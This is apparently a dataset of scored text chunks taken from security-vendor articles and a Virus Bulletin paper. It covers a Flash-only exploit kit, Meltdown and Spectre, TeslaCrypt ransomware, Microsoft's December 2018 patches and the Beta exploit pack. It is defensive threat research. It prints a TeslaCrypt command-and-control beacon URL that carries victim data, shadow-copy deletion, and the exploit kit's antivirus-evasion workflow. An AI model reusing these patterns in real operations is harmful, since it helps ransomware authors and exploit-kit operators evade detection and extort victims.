[8] http://www.csoonline.com/article/2602181/data-protection/attack-hijacks-dns-settings-on-home-routers-in-brazil.html.,0.012621161219543708
[9] http://disconnected.io/2014/03/18/how-i-hacked-your-router/.,0.015166668504961844
[10] https://www.schneier.com/blog/archives/2007/02/driveby_pharmin.html.,0.012158221493966392
[11] https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks.,0.01708986445749383
[12] https://security.stackexchange.com/questions/77112/danger-of-default-router-password.,0.01045926986881296
[13] https://www.symantec.com/connect/blogs/iot-devices-being-increasingly-used-ddos-attacks.,0.01512620578446855
[14] https://blog.sucuri.net/2016/09/iot-home-router-botnet-leveraged-in-large-ddos-attack.html.,0.011725354157337553
[15] http://www.securityfocus.com/bid/70103.,0.00902839368400321
[16] https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability.,0.012280923840135904
[17] https://www.symantec.com/security_response/writeup.jsp?docid=2014-100222-5658-99.,0.012296325765323357
[18] https://www.symantec.com/connect/blogs/mirai-what-you-need-know-about-botnet-behind-recent-major-ddos-attacks.,0.016406607954210006
[19] https://en.wikipedia.org/wiki/DSniff.,0.014795704121885134
[20] https://pastebin.com/0SNSvyjJ.,0.01204776703224153
[21] https://blogs.cisco.com/security/shadow-brokers.,0.01754739964649865
[22] https://github.com/firmadyne/firmadyne.,0.013933343730923142
[23] https://github.com/firmadyne/kernel-v2.6.32/.,0.008904051674613056
[24] https://github.com/firmadyne/kernel-v4.1.,0.008849739484301788
[25] https://github.com/firmadyne/kernel-v3.10.,0.009220105572052106
[26] https://github.com/firmadyne/libnvram.,0.012534286184846533
[27] https://github.com/firmadyne/extractor.,0.013168512919079611
[28] https://github.com/firmadyne/console.,0.012030884457198243
"[29] https://github.com/firmadyne/scraper.
",0.012498360445934442
"‘Flash EK’ skips landing page, goes Flash all the way
We came across a strange new exploitation pattern recently where the payload appeared to be distributed without going through the typical process.
With the majority of exploit kits, the infection chain consists of a landing page, then exploit files (SWF,JAR,PDF, etc.) and finally a binary drop as payload.
In this case, the payload appeared to be isolated and without a landing page:",0.01435929581521378
"At first glance, the capture looks like it is incomplete but upon further review in our logs, I noticed that this strange activity had been going on since at least September 15. (Thanks to Kafeine who confirmed that the exploit kit in question was Flash EK)
To better understand what was going on I decided to try out Sulo, a tool to dissect Flash files (by performing a dynamic analysis) developed by Timo Hirvonen.
After installing Sulo and copying the SWF files on a local server, we browsed to the first SWF file using instrument_ie.cmd",0.014118231048410923
"This slideshow requires JavaScript.
First Flash file (used for redirection):
Pin 2.13 kit 65089
Found supported Flash Player image: C:\WINDOWS\system32\Macromed\Flash\Flash11f.ocx (0xb380000 - 0xbca6fff)
[FlashDumperPlugin] Dumping flash from 0xdc31a00, 11765 bytes
[FlashDumperPlugin] Dumped flash to dumped_flash_0.bin
[FlashDumperPlugin] Dumping flash from 0xe210080, 896 bytes
[FlashDumperPlugin] Dumped flash to dumped_flash_1.bin
Sulo dumped a couple of files following the dynamic analysis. Data that was previously encrypted now appears in clear text:",0.010207774300985739
"I could not find the URL for redirection easily and I suspect it may be buried in an extra layer.
Second Flash file (exploit CVE-2014-0515):
The exploit is nicely identified by this label:",0.005709181112712569
"More importantly, we see the direct connection with the payload:",0.012300009975290016
"In essence this exploitation workflow makes it entirely Flash based, that is until the malware payload.
This infection method has some advantages in that the footprint is minimal and retracing the steps involved is much harder. The redirection mechanism is hiding deep into the Flash files and the domains involved are all different.
Malwarebytes Anti-Exploit blocks the SWF exploit:",0.012157278643552316
"According to Kafeine, there are two threads in the Flash EK: the ‘classic’ one and this new entirely Flash-based one. Flash EK keeps on moving and after disappearing for a while, it was back. More recently Flash EK had dropped Java exploits, which according to Kafeine made it more stealth (and perhaps more effective also).",0.016992689979323794
"It seems Flash EK has dropped Java exploitation : small infection percentage traded for more stealth
— kafeine (@kafeine) September 13, 2014",0.014093362814619592
"Thanks to Timo Hirvonen for building a great tool for SWF analysis which will be especially useful to analyse malvertising attacks. You may also want to check out his presentation at Black Hat USA 2014: Dynamic Flash instrumentation for fun and profit.
@jeromesegura
",0.018626325172976133
Meltdown and Spectre: what you need to know,0.011184262242515786
"UPDATE (as of 1/12/18): Several vendors have produced patches for Meltdown and Spectre, however performance problems dog the fixes. Details on the patches were published here.
UPDATE (as of 1/04/18): Since the Malwarebytes Database Update 1.0.3624, all Malwarebytes users are able to receive the Microsoft patch to mitigate Meltdown.",0.01027578083782954
"Overview
If you’ve been keeping up with computer news over the last few days, you might have heard about Meltdown and Spectre, and you might be wondering what they are and what they can do. Basically, Meltdown and Spectre are the names for multiple new vulnerabilities discovered and reported for numerous processors. Meltdown is a vulnerability for Intel processors while Spectre can be used to attack nearly all processor types.
The potential danger of an attack using these vulnerabilities includes being able to read “secured” memory belonging to a process. This can do things like reveal personally identifiable information, banking information, and of course usernames and passwords. For Meltdown, an actual malicious process needs to be running on the system to interact, while Spectre can be launched from the browser using a script.
Microsoft, Google, Mozilla, and other vendors have been releasing patches all day to help protect users from this vulnerability. Some of the updates from Microsoft may negatively interact with certain antivirus solutions. However, Malwarebytes is completely compatible with our latest database update. The best thing to do to protect yourself is to update your browsers and your operating system with these patches as soon as you see an update available.
For a quick guide on how to protect yourself from this threat, please check out “Meltdown and Spectre Vulnerabilities – what you should do to protect your computer” on the Malwarebytes support knowledge base.
Details
The Google Project Zero team, in collaboration with other academic researchers, has published information about three variants of a hardware bug with important ramifications. These variants—branch target injection (CVE-2017-5715), bounds check bypass (CVE-2017-5753), and rogue data cache load (CVE-2017-5754)—affect all modern processors.
If you’re wondering if you could be impacted, the answer is most certainly yes.
The vulnerabilities, named Meltdown and Spectre, are particularly nasty, since they take place at a low level on the system, which makes them hard to find and hard to fix.
Modern computer architecture isolates user applications and the operating system, which helps to prevent unauthorized reading or writing to the system’s memory. Similarly, this design prevents programs from accessing memory used by other programs. What Meltdown and Spectre do is bypass those security measures, therefore opening countless possibilities for exploitation.
The core issue stems from a design flaw that allows attackers access to memory contents from any device, be it desktop, smart phone, or cloud server, exposing passwords and other sensitive data. The flaw in question is tied to what is called speculative execution, which happens when a processor guesses the next operations to perform based on previously cached iterations.
The Meltdown variant only impacts Intel CPUs, whereas the second set of Spectre variants impacts all vendors of CPUs with support of speculative execution. This includes most CPUs produced during the last 15 years from Intel, AMD, ARM, and IBM.
It is not known whether threat actors are currently using these bugs. Although due to their implementation, it might be impossible to find out, as confirmed by the vulnerability researchers:
Can I detect if someone has exploited Meltdown or Spectre against me?
Probably not. The exploitation does not leave any traces in traditional log files.
While there are no attacks reported in the wild as of yet, several Proof of Concepts have been made available, including this video that shows a memory extraction (using a non-disclosed POC). This is particularly damaging because 1. There aren’t many options for protection currently and 2. as previously stated, even if threat actors do spring to action, it might be impossible to verify if that’s the case.
Mitigations
Because the Meltdown and Spectre variants are hardware vulnerabilities, deploying security programs or adopting safer surfing habits will do little to protect against potential attack. However, a patch for the Meltdown variant has already been rolled out on Linux, macOS, and all supported versions of Windows.
According to our telemetry, most Malwarebytes users are already able to receive the latest Microsoft update. However, we are working to ensure that our entire user base has access to the patch.
Unfortunately, Microsoft’s fix comes with significant impact on performance, although estimates of how much vary greatly. An advisory from Microsoft recommends users to:",0.01725189103724667
"Keep computers up to date.
Install the applicable firmware update provided by OEM device manufacturers.",0.016746160390886056
"If you are having issues getting the Windows update, please refer to this article, as Microsoft has stated some possible incompatibility issues with certain security software.
No software patch for Spectre is available at the time of this article. Partial hardening and mitigations are being worked on, but they are unlikely to be published soon.
The Spectre bug can be exploited via JavaScript and WebAssembly, which makes it even more critical. It is therefore recommended to apply some countermeasures such as Site Isolation in Chrome. Mozilla is rolling out a Firefox patch to mitigate the issue while working on a long-term solution. Microsoft is taking similar action for Edge and Internet Explorer.
Cloud providers (Amazon, Online.net, DigitalOcean) also rushed to issue emergency notifications to their customers for upcoming downtimes in order to prevent situations where code from the hypervisor could be leaked from a virtual machine, for example.
The aftermath from these bugs is far from being completely understood, so please check back on this blog for further updates.
Vendor advisories:",0.012146731017856793
"Intel: https://newsroom.intel.com/news/intel-responds-to-security-research-findings/
AMD: http://www.amd.com/en/corporate/speculative-execution
ARM: https://developer.arm.com/support/security-update
",0.011092170271899016
The current state of ransomware: TeslaCrypt,0.009800595381966315
"Written by
Editor",0.007990427730288352
"January 06, 2016",0.009560728253368622
Enduser Network Security Tips Threat Research Cryptolocker Cryptowall malware Ransomware TeslaCrypt,0.010781358094274496
"So far, our series on the current state of ransomware has taken an in-depth look at three ransomware families: CryptoWall, TorrentLocker and CTB-Locker. Today we’ll talk about the variant known as TeslaCrypt.
TeslaCrypt (a.k.a. EccKrypt) is one of the most recent ransomware variants we’ve seen widely that encrypts certain user files and demands a ransom be paid to decrypt the files. Similar to other variants, it uses an AES symmetric algorithm to encrypt files.
TeslaCrypt is distributed widely via the Angler exploit kit and a few other known exploit kits. Using Angler, it exploits Adobe Flash (CVE-2015-0311) and, once successfully exploited, it downloads TeslaCrypt as a payload.",0.015633775335083144
"Angler is exploited via an injected iframe from the compromised website. It redirects to a landing page that is highly obfuscated, contains anti-vm techniques, and performs checks for the presence of antivirus software or malware analysis tools like fiddler, etc.
For each obfuscation code, it contains de-obfuscation script in the same web page.
Figure 1 shows the snippet of the obfuscated script in the landing page.",0.01178841212375803
And Figure 2 is the de-obfuscated script that checks for the presence of various antivirus software.,0.012891791130915875
"Once all the conditions are met, the decrypted URLs download the Flash exploit which, in turn, downloads the ransomware payload in the temp folder.
It also uses Xtea algorithm to decode the encoded payload. Apart from the Flash exploit, we have also seen exploits related to Silverlight and Internet Explorer.
Angler doesn’t use the file-less payload technique – rather it writes the payload ransomware into the disk.
Execution
The TeslaCrypt binary that we have seen so far is usually compiled using Visual C++. The ransomware code is then encoded/compressed within the binary itself.
After decrypting its code in memory, TeslaCrypt overwrites the decrypted MZ binary onto itself.
The decrypted memory MZ binary is also compiled using Visual C++.
It runs multiple threads for different purposes.",0.016453954538028448
"File encryption thread.
Monitors the following process names and terminates them.",0.0126751428492905
"exe
msconfig
regedit
procexp
taskmgr",0.009454733155185968
"Contacts the command and control server and sends a few specific details such as the sha-256 value of the key generated from key.dat, Bitcoin address, number of files encrypted, user IP address, etc., as base64 encoded parameter.
Deletes all backup volume shadow files using vssadmin.exe.",0.014847492769468507
"Encryption
TeslaCrypt creates key.dat under %appdata% where it also drops a copy of itself and creates log.html to store the list of files encrypted. It encrypts user-specific files by enumerating all directories including network drives.
Figure 3 shows the lists of file extensions that will be encrypted, including some related to dozens of games, including saved games, configurations, maps and replays.",0.01352748628895073
"It uses AES cipher for encrypting files and stores sha-256 values of the different keys in key.dat along with a Bitcoin payment key. The key.dat structure varies between different variants that we have seen.
It also stores other key information which is not known at the moment.
Also, irrespective of a successful connection to the command and control server, the dropper file still encrypts files. After successful encryption, it shows the GUI window giving details about the payment option.
It also uses some OpenSSL libraries, probably for generating Bitcoin addresses.
After encrypting files, it renames them. Below are some of the extension names it uses for the variants we have seen so far:",0.010827996012531926
".encrypted
.ecc
.ezz
.exx",0.010724588868456286
"Network Communication
After encrypting a specific list of files, it connects to the command and control server via the TOR network using different TOR proxy servers along with specific details as base-64 encoded parameter.
Encoded URI pattern:
hxxp://dpckd2ftmf7lelsa.afnwdsy4j32.com/tsdfewr2.php?U3ViamVjdD1DcnlwdGVkJmtleT01MzE3QzlFOENGMDMwOUZFODgx
MTBGMTBGQzFCMEUwNzk1MDIzNDlEQTg5MjA3QzJDQjZENDUyOUM
2QzIzQUE5JmFkZHI9MUQyUHF5M0g5c280Q0JheXFkTWo0V0N1cmNSek
QxUXJBYSZmaWxlcz05MCZzaXplPTE1MSZ2ZXJzaW9uPTAuMy43YiZkYXR
lPTE0MzA4MzI1ODgmT1M9MjYwMCZJRD03MiZzdWJpZD0wJmdhdGU9Rz
AmaXNfYWRtaW49MSZpc182ND0wJmlwPTU0LjcyLjIyNS4yNDMmZXhlX3
R5cGU9MQ==
Decoded URI pattern:
hxxp://dpckd2ftmf7lelsa.afnwdsy4j32.com/tsdfewr2.php?Subject=Crypted&key=1BF7BEF096B61D09F6F59B83FC5A4B5AD18627
E65BA0E018174B4C500038ED80&addr=1EqKCDymcbeBKVjGSq9D8pavGF
yrjCyvz7&files=2143&size=773&version=0.3.0&date=1425073689
&OS=2600&ID=20&subid=0&gate=G0&is_admin=1&is_64=0&ip=193.128.108.238
It then fetches the user’s IP address by contacting “ipinfo.io”.
Ransom Payment
After encrypting the list of files, it launches a GUI window to show the user that their files have been encrypted and offers them a payment option to get the decryption key as shown in Figure 4.",0.011837925433502372
"It also gives the option to decrypt a single file for free, as shown in Figure 5, in order to convince the user that they will get back all their files once they pay.",0.00980534692458368
"TeslaCrypt gives the option to use Bitcoin, PaySafeCard or Ukash for payment. We haven’t yet seen evidence that it can target any non-English users by using other languages in their ransom GUI window.
Statistics
Among all the variants analyzed in this paper, next to CryptoWall, TeslaCrypt has the most number of infections seen widely across all countries.",0.012466528376757102
"Protection:
Sophos protects its customers from TeslaCrypt using the following detections: HPmal/EccKrpt-A, Troj/TeslaCrypt-*, Mal/ TeslaCrypt-*, Troj/Ransom-*.
Having Sophos HIPS technology enabled is strongly recommended to block ransomware proactively.
If you suspect you’ve been compromised by ransomware, you can remove the malware using our Free Virus Removal Tool. Sadly, there’s not much you can do to get your files back except to pay the ransom – the encryption is too strong to crack.
Apart from having your antivirus up to date, there are additional system changes to help prevent or disarm ransomware infections that a user can apply.
1. Back up your files.
The best way to ensure you do not lose your files to ransomware is to back them up regularly. Storing your backup separately is also key – as discussed, some ransomware variants delete Windows shadow copies of files as a further tactic to prevent your recovery, so you need to store your backup offline.
2. Apply windows and other software updates regularly.
Keep your system and applications up to date. This gives you the best chance to avoid your system being exploited using drive-by download attacks and software (particularly Adobe Flash, Microsoft Silverlight, Web Browser, etc.) vulnerabilities which are known for installing ransomware.
3. Avoid clicking untrusted email links or opening unsolicited email attachments.
Most ransomware arrives via spam email either by clicking the links or as attachments. Having a good email anti-virus scanner would also proactively block compromised or malicious website links or binary attachments that lead to ransomware.
4. Disable ActiveX content in Microsoft Office applications such as Word, Excel, etc.
We’ve seen many malicious documents that contain macros which can further download ransomware silently in the background.
5. Install a firewall, block Tor and I2P, and restrict to specific ports.
Preventing the malware from reaching its call-home server via the network can disarm an active ransomware variant. As such, blocking connections to I2P or Tor servers via a firewall is an effective measure.
6. Disable remote desktop connections.
Disable remote desktop connections if they are not required in your environment, so that malicious authors cannot access your machine remotely.
7. Block binaries running from %APPDATA% and %TEMP% paths.
Most of the ransomware files are dropped and executed from these locations, so blocking execution would prevent the ransomware from running.",0.0200300079803174
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"7
",0.01923895472649928
Microsoft’s December updates fix several dozen serious problems,0.0071839652351849415
Don't give your computers a year-end holiday from regular updates this month,0.011117999800374867
"Written by
SophosLabs Offensive Security",0.008622298185940958
"December 14, 2018",0.00959967911255255
SophosLabs Uncut Microsoft Patch Patch Tuesday Update Windows Windows Update,0.008903542359154137
"After last week’s out of bound patch for Adobe Flash Player, which fixed two vulnerabilities, Microsoft released their monthly security updates for December on Tuesday. This month’s fixes address 38 vulnerabilities that affect Windows and a range of software that runs on Windows, including the IE and Edge browsers, the .NET framework, Microsoft Office applications such as Excel, Word, PowerPoint and Outlook and a few Windows Server services. In addition, there were patches released for two critical vulnerabilities in Adobe Flash, and for 85 vulnerabilities in Adobe Reader.
Among the 38 vulnerabilities in Microsoft products, 9 are categorized by Microsoft as critical and the rest important this month. About half of the critical vulnerabilities allow an attacker to execute remote code on the targeted system, while a handful can be used to elevate privileges on the infected machine. Through a successful social engineering attack (either with a malicious website or Office documents), an external attacker could fully compromise a targeted user’s machine.
All nine critical vulnerabilities are related to remote code execution; six are for Edge, one for Internet Explorer, one remote code injection in .NET, and one affects the Windows DNS Server. One of the Flash Player vulnerabilities (CVE-2018-15982) and one elevation of privilege vulnerability in the Windows NT kernel (CVE-2018-8611) have been observed in the wild, which makes them a must-patch.
Let’s have a closer look at some of the interesting vulnerabilities.
CVE-2018-15982 Adobe Flash Player Use After Free Remote Code Execution Vulnerability
In the TVSDK library, it is possible to get a dangling pointer that references an old and unused memory region. A subsequent allocation could overlap on that old memory region which could lead to a use after free vulnerability. The resulting type mismatch between the dangling pointer and the new allocation could lead a remote attacker to gain remote code execution. This vulnerability has been exploited in the wild.
CVE-2018-8611 Windows Kernel Elevation of Privilege Vulnerability
The NT kernel on 64-bit Windows 7 fails to handle some specific objects in memory that could be overwritten with arbitrary data. An attacker with code execution on the machine whether is local or remote through another exploit, could run a specially crafted application that would trigger the vulnerability to elevate the privilege to System. This vulnerability has been exploited in the wild.
CVE-2018-8583, CVE-2018-8617, CVE-2018-8618, CVE-2018-8624, CVE-2018-8626, CVE-2018-8629 Chakra Scripting Engine Memory Corruption Vulnerability
ChakraCore, the JavaScript engine of the Edge web browser, has multiple type confusion and out of bound write vulnerabilities that could lead a remote attacker, through a malicious website, to gain control of the targeted Windows 10 machine. The vulnerabilities, which have not been spotted exploited in the wild (yet) are all addressed in a single patch that will vary depending on whether your computer is running build 1703, 1709, 1803, or 1809 of Windows 10, which brings your version of ChakraCore up to 1.11.4.
CVE-2018-8634 Microsoft Text-To-Speech Remote Code Execution Vulnerability
The Microsoft test-to-speech feature, that can be access with a JavaScript script on the Edge web browser, suffers from a buffer overflow vulnerability. A remote attacker, through a website, could trigger the vulnerability and gain code execution on the victim’s computer.
CVE-2018-8540 .NET Framework Remote Code Injection Vulnerability
While this vulnerability sounds bad, it hasn’t been seen in the wild. Attackers who leverage it could run programs, view or change data, or create new user accounts on the affected computer. Moreover, the vulnerability requires an attacker to pass specially crafted data to a vulnerable .NET application, so even though the patch level is rated critical, Microsoft considers the actual possibility of exploitation as “less likely” — at least, for the moment. Unless you enjoy living life as a guinea pig, you’re better off patching now.
CVE-2018-8631 Internet Explorer Memory Corruption Vulnerability
Remember Internet Explorer? Researchers discovered an out of bounds vulnerability in the Internet Explorer 11 JScript engine that a remote attacker could leverage to execute arbitrary code. JScript is the old JavaScript engine of Internet Explorer that was replaced by ChakraCore. However, a webpage could still make a request that would force the use of JScript, instead of ChakraCore, to interpret its JavaScript code.
CVE-2018-8626 Windows DNS Server Heap Overflow Vulnerability
The Domain Name System (DNS) server on Windows 10, or in Windows Server 2012, 2016, 2019, or Server Core does not handle remote requests properly. All it takes for a remote attacker to run arbitrary code in the context of the highly privileged Local System account, and take full control of the machine, is to send it a properly crafted DNS request. Ouch.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.015592478698554957
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2018-15982
Exp/201815982-ATroj/SWFExp-OP
Troj/SWFExp-OQ
Troj/SWFExp-OR
Troj/Crisis-B (payload)
sid:2200964
N/V",0.013964137372386887
CVE-2018-8631,0.009653107809374784
"SID:9000791
N/V",0.007522223383950921
CVE-2018-8587,0.009147213424836265
sid:48407,0.008582562904541291
CVE-2018-8617,0.009502286908887103
sid:2200885,0.008474670906109205
CVE-2018-8624,0.009301435387770507
sid:2200967,0.008811199528588887
CVE-2018-8583,0.009268450451303756
sid:2200965,0.008535153711211385
CVE-2018-8618,0.009501993576394918
sid:2200966,0.008509139197478643
CVE-2018-8625,0.009416682265522391
sid:9000788,0.0085893473857378
CVE-2018-8628,0.009477092780316165
sid:9000789,0.00865898066598536
CVE-2018-8629,0.009275354286843562
sid:9000790,0.00848606209792857
CVE-2018-8631,0.009653107809374784
sid:9000791,0.008321594535092736
CVE-2018-8634,0.009445274016382177
sid:900792,0.008461776133864674
CVE-2018-8629,0.009275354286843562
sid:9000793,0.008358084424668455
"N/V = Not Validated. The PoC code provided with MAPP advisories does not include active exploits and as such is not applicable to Intercept X testing. The Intercept-X ability to block the exploit depends on actual exploit weaponization approach which we won’t see until it’s spotted in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks.
How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.012290223883243856
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Beta exploit pack: one more piece of crimeware for the infection road!
2015-06-18",0.009836296988336435
"Aditya K. Sood
Michigan State University
,
USA",0.011136966587390495
"Rohit Bansal
Independent Security Researcher
,
USA
Editor:
Martijn",0.010760725605043375
"Grooten
Abstract
Beta BEP appears to be the latest exploit kit in development. After finding their way into a Beta BEP C&C panel, Aditya Sood and Rohit Bansal were able to gather intelligence about the structure and working of the exploit pack. Here they share their findings about the pack - which they believe we will start to see being used in the coming months.
Copyright © 2015 Virus Bulletin",0.009663773651622964
"Browser exploit packs (BEPs) or exploit kits are used extensively in drive-by download attacks to infect target systems on the Internet. BEPs are used to distribute advanced malware to end user systems after exploiting vulnerabilities in browsers’ components or embedded plug-ins. BEPs are hosted on compromised domains and victims are coerced into visiting those domains either through spear phishing or through URLs shared on social networks and so on. On visiting a compromised domain, the victim’s browser is fingerprinted and if a vulnerable component is found, the respective exploit is served and malware is downloaded onto the system. In previous papers, we have presented details of the BlackHole [1], Sweet Orange [2] and Styx [3] BEPs to highlight their design and tactics. Several of the techniques used by Beta Browser Exploit Pack (Beta BEP) are very similar to those used by these exploit packs.
Beta BEP (which is unrelated to the Beta bot) is the latest exploit kit in development. At BlackHat USA 2014 [4], we discussed several fundamental weaknesses in the command and control (C&C) panels used by various pieces of crimeware. The idea of that research was to look for potential issues in web-based C&C panels and to reveal how to find security flaws in them in order to gather intelligence. It came as no surprise that we were able to find our way into a Beta BEP C&C panel and gather some intelligence about the structure and working of the Beta exploit pack. The author of the exploit pack did revoke and take down the panel shortly after we had found our way in, but not before we had extracted some meaty details from it.
We have been studying this exploit pack and gathering data for several weeks now – publishing delays are an unavoidable part of the process of releasing intelligence. Meanwhile, we discovered that another researcher had released an analysis of a very similar exploit kit under the name of ‘Sundown EK’ [5]. In his analysis, the researcher covered details of the network traffic and how the infection is triggered. He reported certain things that are very similar to what we found in our analysis of Beta BEP, as well as some that are slightly different:
The BEP under discussion in this article is sold in the underground market under the name of ‘Beta’; the one analysed in [5] has been given the name ‘Sundown’ by the researcher who discovered it. The analysis of Sundown covers the BEP’s initial testing URLs, which is why the exploits used and URL structure are similar in nature to those we see in Beta.
In [5], the version of Sundown analysed is ‘0.1a’, whereas we analysed version 3.0 of Beta BEP. The author of the exploit kit actually claims Beta as copyleft (a method of making software free so that it can be modified and extended by other developers, thereby maintaining the ‘free software’ clause). We are not sure that copyleft makes any sense in the context of software that is sold in the underground market, and if source code is shared it will be modified accordingly.
The Sundown exploit kit is still under development and it appears that the author is testing it for effectiveness. We have not encountered any real-time cases of Beta BEP version ‘3.0’ being used in the wild, but since it is also in a testing phase, we believe that it will be running live somewhere privately. We tried to access the configured URLs we found in the C&C but all of the domains had been taken down and no active infection URLs were detected.
The rental price of Beta BEP is between $2,000 per month and $100 per day.
As a research community, it’s always good practice to collaborate and share intelligence so that we can tackle issues in a more granular way.",0.01838777191497698
"C&C panel
Primarily, the Beta BEP consists of the following components:
A component for collecting statistics on successful infections.
A component that will upload a malicious executable and check whether it can bypass anti-virus en-gines.
A component that is used to configure domains for serving exploits and which checks the domains for potential detection or flagging by anti-virus engines.
Listing 1 shows the basic structure of the Beta BEP that was configured on the C&C server.
http://<beta_cpanel.com>:8092/SDDS/private/panel.php?section=stats",0.007297681266476896
http://<beta_cpanel.com>:8092/SDDS/private/panel.php?section=files,0.008995539499156657
http://<beta_cpanel.com>:8092/SDDS/private/panel.php?section=domains,0.009430675883832618
http://<beta_cpanel.com>:8092/SDDS/private/panel.php,0.008270342409917864
Listing 1: Beta BEP C&C structural components.,0.012711432027476044
"Target domain scanning
Beta BEP has a built-in functionality for determining the effectiveness of the domain that is used to deploy the exploit or executable which is served to the victim’s machine during an attack. When a vulnerability is found and an exploit successfully executed, the infected domain is queried in order to download the malicious executable. Beta BEP uses Scan4You [6], which is a freely available service that will check the robustness of a target domain (hosting exploits or malicious executables) against various anti-virus engines to verify its rate of detection. The idea is to check up front whether or not the configured exploit URL can be detected as malicious. Avoiding exposure to detection solutions is important in order for the malware to be served in a stealthy manner. If the target domain is found to be included on blacklists or flagged as malicious, a new one can easily be configured by the Beta BEP controller in order to continue the infection spreading mechanism. Figure 1 and Figure 2 show how Beta BEP scans the target URLs and domains to verify their detection rate by various security vendors.
Figure 1. Target domains are tested against the Scan4You service.
Figure 2. Beta BEP domain-scanning component.
The structure of the exploit-serving URLs is presented in Listing 2.
http://www.example.com:8092/776576YTU76876867HYTUYTUYTUYHYTUYHTFY/drgdrfydtuytygtryfgtrfgtrfg.php",0.013141867970352217
http://www.example.org:8092/776576YTU76876867HYTUYTUYTUYHYTUYHTFY/drgdrfydtuytygtryfgtrfgtrfg.php,0.012021463254187292
http://example.co.vu:8092/776576YTU76876867HYTUYTUYTUYHYTUYHTFY/drgdrfydtuytygtryfgtrfgtrfg.php,0.011810289192500267
Listing 2: Structure of exploit-service URLs.,0.01193807123651247
"Part of the URL uses an encoding scheme, but we are not sure what type of encoding is used. Incorporating obfuscated strings into URLs is a technique commonly used by BEPs in order to bypass certain detection solutions. Figure 3 shows one of the configured domains being tested for maliciousness using the Scan4You service.
Figure 3. Scan4You service in action.",0.01111983513997361
"Malicious executable scanning
Beta BEP allows only one file at a time to be uploaded to the C&C, which then gets compressed and embedded in the required exploit. At this point, it seems that multiple malware files are not supported: if the malicious executable needs to be replaced, the previous executable (or binary) file must be deleted and cleaned in order to provide a clean environment for the new executable to be incorporated into the exploits. Like the exploit-serving URLs, the uploaded malware executable is scanned to check its rate of detection by anti-virus engines. Figure 4 shows the file uploading and scanning functionality of Beta BEP.
Figure 4. File uploading and scanning capability in Beta BEP.",0.00936238979692583
"Exploits for specific vulnerabilities
Table 1 shows the exploits that are supported by Beta BEP as part of its design. There is the possibility for more exploits to be added and/or existing exploits removed later on. As can be seen from the CVEs, Flash exploits are preferred. This is because of the recent rise in the number of remote code execution vulnerabilities in Flash.
S. No.
CVEs
Description
1
CVE-2015-0311
Unspecified vulnerability in Adobe Flash Player through 13.0.0.262 and 14.x, 15.x, and 16.x through 16.0.0.287 on Windows and OS X and through 11.2.202.438 on Linux allows remote attackers to execute arbitrary code via unknown vectors.
2
CVE-2015-0359
Double free vulnerability in Adobe Flash Player before 13.0.0.281 and 14.x through 17.x before 17.0.0.169 on Windows and OS X and before 11.2.202.457 on Linux allows attackers to execute arbitrary code via unspecified vectors.
3
CVE-2015-0313
Use-after-free vulnerability in Adobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows and OS X and before 11.2.202.442 on Linux allows remote attackers to exe-cute arbitrary code via unspecified vectors.
4
CVE-2014-0556
Heap-based buffer overflow in Adobe Flash Player before 13.0.0.244 and 14.x and 15.x before 15.0.0.152 on Windows and OS X and before 11.2.202.406 on Linux, Adobe AIR before 15.0.0.249 on Windows and OS X and before 15.0.0.252 on Android, Adobe AIR SDK before 15.0.0.249, and Adobe AIR SDK & Compiler before 15.0.0.249 allows attackers to execute arbitrary code via unspecified vectors.
5
CVE-2014-6332
OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows remote attackers to execute arbitrary code via a crafted website, as demonstrated by an array-redimensioning attempt that triggers improper handling of a size value in the SafeArrayDimen function, a.k.a. ‘Windows OLE Automation Array Remote Code Execution Vulnerability’.
6
CVE-2012-1876
Microsoft Internet Explorer 6 through 9, and 10 Consumer Preview, does not properly handle objects in memory, which allows remote attackers to execute arbitrary code by attempting to access a nonexistent object, leading to a heap-based buffer overflow, a.k.a. ‘Col Element Remote Code Execution Vulnerability’.
Table 1. Exploits provided in Beta BEP 3.0.",0.007704394647411572
"Infection statistics
We know that most crimeware service providers rent out BEPs to collect money based on successful pay-per infections (PPI). However, BEPs can also be sold directly for a lump sum. We found that Beta BEP collects the following statistics:
Information about compromised browsers
Details of the countries in which successful infections have triggered, which means that geo-location tagging is enabled in Beta BEP
Numbers of successful infections (or exploited end-user machines), hit rate and so on.
Figure 5 shows a snapshot taken from the Beta BEP deployment.
Figure 5. Beta BEP stats panel.",0.014507262173330537
"Conclusion
As we have discussed, Beta BEP is not as active in the real market as, for example, Fiesta or Angler, but we believe that we will start to see it being used in the coming months. We were not able to collect enough data to dissect the network-level details of the BEP and understand how exactly the exploits are served, but we believe that revealing as much information as we know about Beta BEP will benefit the security research community, making researchers aware of the upcoming threat so that appropriate defences can be designed and put in place to combat it.",0.012897188596118991
"Bibliography
[1] Browser Exploit Packs – Death with Bundled Exploits. http://www.virusbtn.com/pdf/conference/vb2011/VB2011-Sood-Enbody.pdf.
[2] What are browser exploit kits up to? A look into Sweet Orange and ProPack. https://www.virusbtn.com/virusbulletin/archive/2013/03/vb201303-SweetOrange-ProPack.
[3] Styx Exploit Pack: Insidious Design Analysis. https://www.virusbtn.com/virusbulletin/archive/2013/09/vb201309-Styx.
